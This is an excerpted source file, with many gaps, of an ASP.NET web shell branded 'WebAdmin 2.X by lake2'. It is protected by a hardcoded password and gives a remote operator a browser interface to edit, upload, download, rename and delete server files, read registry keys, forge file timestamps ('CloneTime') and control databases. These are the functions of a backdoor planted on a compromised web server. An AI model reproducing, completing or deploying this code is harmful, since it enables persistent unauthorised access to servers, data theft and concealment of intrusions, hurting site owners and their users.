...
<script runat="server">
Dim PASSWORD as string = "zax123456"   'Here , modify the default password "webadmin" to yours
'----------------------------------------------------------------------
'-----------------           WebAdmin by lake2        -----------------
...
Try
	...
	rk.Close()
Catch error_x
	Label1.Text = "Error ! This key isn't exist ?"
End Try
End Sub
sub Editor(Src As Object, E As EventArgs)
	...
	mywrite.close
	response.Write("<script>alert('Edit|Creat " & replace(filepath.text,"\","\\") & " Success! Please refresh')</sc"&"ript>")
end sub
Sub UpLoad(Src As Object, E As EventArgs)
	...
	if  file.exists(loadpath)=true then 
		response.Write("<script>alert('File " & replace(loadpath,"\","\\") & " have existed , upload fail!')</sc"&"ript>")
		response.End()
	end if
	UpFile.postedfile.saveas(loadpath)
	response.Write("<script>alert('File " & replace(filename,"\","\\") & " upload success!\nFile info:\n\nClient Path:" & replace(UpFile.value,"\","\\") & "\nFile Size:" & UpFile.postedfile.contentlength & " bytes\nSave Path:" & replace(loadpath,"\","\\") & "\n');</scri"&"pt>")
End Sub
Sub NewFD(Src As Object, E As EventArgs)
	...
	if NewFile.Checked = True then
		...
		response.Write("<script>alert('Creat directory " & replace(url & NewName.Text ,"\","\\") & " Success! Please refresh !');</sc" & "ript>")
	end if
End Sub
Sub del(a)
	if right(a,1)="\" then
...
Sub existdir(temp)
		if  file.exists(temp)=false and directory.exists(temp)=false then 
			response.Write("<script>alert('Don\'t exist " & replace(temp,"\","\\")  &" ! ');</sc" & "ript>")
...
<%
	...
	dim xfile as fileinfo
%>
<p align="center">Currently Dir: <font color=red><%=url%></font></p>
<table width="70%"  border="0" align="center">
  <tr>
    <td width="13%">Operate:</td>
    <td width="87%"><a href="?action=new&src=<%=server.UrlEncode(url)%>" title="New file or directory" target="_blank">New</a>
      <%if session("cutboard")<>"" then%>
      <a href="?action=plaster&src=<%=server.UrlEncode(url)%>" title="you can plaster">plaster</a>
      <%else%>
plaster
<%end if%>
<a href="?action=upfile&src=<%=server.UrlEncode(url)%>" title="Upload file" target="_blank">UpLoad</a> <a href="?action=goto&src=" & <%=server.MapPath(".")%> title="Go to this file's directory">GoBackDir </a><a href="?action=logout" title="Exit">Quit</a></td>
  </tr>
  <tr>
    <td>
	Go to: </td>
	...
	<td width="25%"><strong>Operate</strong></td>
      ...
      <tr>
		...
		for each xfile in mydir.getfiles()
			...
			hupo="<td><a href='?action=edit&src=" & filepath2 & "' target='_blank'>Edit</a>|<a href='?action=cut&src=" & filepath2 & "' target='_blank'>Cut</a>|<a href='?action=copy&src=" & filepath2 & "' target='_blank'>Copy</a>|<a href='?action=rename&src=" & filepath2 & "' target='_blank'>Rename</a>|<a href='?action=down&src=" & filepath2 & "' onClick='return down(this);'>Download</a>|<a href='?action=del&src=" & filepath2 & "' onClick='return del(this);'>Del</a></td>"
			response.Write(hupo)
			response.Write("</tr>")
		next
...
function down()
{
if(confirm("If the file size > 10M,\nPlease don\'t download\nYou shall copy file to web directory ,use web browse download\nAre you sure download?")){return true;}
else{return false;}
}
</script>
<%
...
<table width="80%"  border="1" align="center">
  <tr>
    <td colspan="2"><span class="style3">Web Server Information                 </span><i><a href="javascript:closewindow();">Close</a></i></td>
  </tr>
  <tr>
...
if(formRn.name.value==""){alert("You shall input filename :(");return false}
  ...
  <%
			...
			if Rename() then
				response.Write("<script>alert('Rename " & replace(url,"\","\\") & " to " & replace(Getparentdir(url) & request.Form("name"),"\","\\") & " Success! Please refresh !');location.href='JavaScript:self.close()';</script>")
			else
				response.Write("<script>alert('Exist the same name file , rename fail :(');location.href='JavaScript:self.close()';</script>")
			end if
		end if
	case "samename"
		url=request.QueryString("src")
...
<a href="javascript:history.back(1);" style="color:#FF0000">Go Back</a>
   <%
	...
	%>
<form runat="server">
  <p>[CloneTime for WebAdmin]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:closewindow();">Close</a></i> </p>
...
<p>
  ...
  %>
<form runat="server">
  <p>[Read Reg for WebAdmin]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:closewindow();">Close</a></i> </p>
...
<asp:Label ID="Label1" runat="server" />
  ...
  %>
<form runat="server">
  <p>[Control DataBase for WebAdmin]<i>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:closewindow();">Close</a></i> </p>
...
<p align="center">WebAdmin2.X By <a href="http://lake2.0x54.org" title="Welcome to my page:)" target="_blank"><em>lake2</em></a> from China [<a href="http://blog.csdn.net/lake2/archive/2005/01/27/270921.aspx" target="_blank">Feedback</a>]</p>
</body>
</html>
